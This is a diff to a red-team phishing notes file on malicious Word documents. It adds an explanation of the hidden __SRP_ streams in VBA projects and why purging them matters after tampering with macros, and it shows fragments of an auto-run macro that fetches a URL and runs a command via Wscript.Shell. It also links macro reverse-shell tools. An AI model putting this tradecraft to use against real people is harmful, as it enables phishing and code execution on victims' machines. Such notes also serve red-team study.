@@ -10,6 +10,48 @@
     * [Links](../../red_team/phishing/word.md#links)
 # Word
 
+## SRP (Software Restriction Policy)
+
+Inside OLE structured storage (used by .doc, .xls, etc.), VBA projects live under:
+
+Root\Macros\VBA\ (Word)
+
+Root\_VBA_PROJECT_CUR\VBA\ (Excel)
+
+Besides the well-known streams (dir, module names, _VBA_PROJECT), Office sometimes creates hidden internal streams named:
+```
+__SRP_0
+__SRP_1
+__SRP_2
+__SRP_3
+```
+These streams are used by Office’s macro security enforcement, especially when:
+
+* Macros are blocked by policy
+* The document is opened from untrusted locations
+* Zone identifiers / Mark-of-the-Web are involved
+* AMSI / VBA policy enforcement triggers
+
+They store policy evaluation metadata, not executable logic.
+
+If these streams exist and the VBA project changes underneath them, Office may:
+ 
+* Refuse to load macros
+* Mark the project as corrupted
+* Keep macros disabled even if policy allows them
+
+So purging them is a consistency / hygiene step, not a magic bypass.
+
+Deleting these streams:
+
+* Removes Office’s cached security decision
+* Forces Office to re-evaluate the VBA project on next open
+* Cleans up artifacts left by previous policy evaluation
+* Often used after modifying VBA streams to avoid corruption or load errors
+
+
+* [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
+
 ## Remote Template Injection
 
 a normal.doc with a remote dotm template which will run macro when open...it download the template and run the script inside
@@ -60,9 +102,9 @@ Sub AutoOpen()
 	Jubeaz
 End Sub
 
-Sub Document_Open()
-	Jubeaz
-End Sub
+' Sub Document_Open()
+' 	Jubeaz
+' End Sub
 
 Sub Jubeaz()
 	Dim url as String
@@ -90,6 +132,7 @@ CreateObject("Wscript.Shell").Run Str
 * [spoofing-office-macro ](https://github.com/christophetd/spoofing-office-macro/tree/master)
 * [macro_reverse_shell](https://github.com/glowbase/macro_reverse_shell)
 * [solid-macro](https://github.com/noderaven/solid-macro)
+
 ## Links
 * [Phishing with MS Office](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office)
 * [How To Make A Reverse Shell With Microsoft Word Macros](https://medium.com/@calvintconnor/how-to-make-a-reverse-shell-with-microsoft-word-macros-94797534ffb3)
